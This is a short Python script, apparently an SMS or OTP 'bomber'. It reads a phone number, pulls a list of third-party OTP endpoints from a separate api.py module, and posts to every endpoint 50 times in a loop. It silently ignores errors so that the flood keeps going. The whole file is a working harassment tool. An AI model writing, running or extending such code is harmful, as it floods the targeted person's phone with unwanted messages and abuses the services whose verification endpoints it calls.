from api import send_otp_requests
import requests

# Receive phone number input from the user
try:
    number = input("Enter your phone number for OTP requests (ex: 9110000000): ")

    # Get APIs from api.py
    apis = send_otp_requests(number)

    # Loop to send OTPs 50 times
    for _ in range(50):
        for url, payload in apis:
            try:
                response = requests.post(url, data=payload)
                
                if response.status_code == 200:
                    print(f"OTP sent successfully via {url}.")
                    # Process the response here if needed
                
            except requests.exceptions.RequestException:
                pass  # Ignore exceptions and continue with the next request

except KeyboardInterrupt:
    print("\nGoodbye!")  # Display farewell message on keyboard interruption
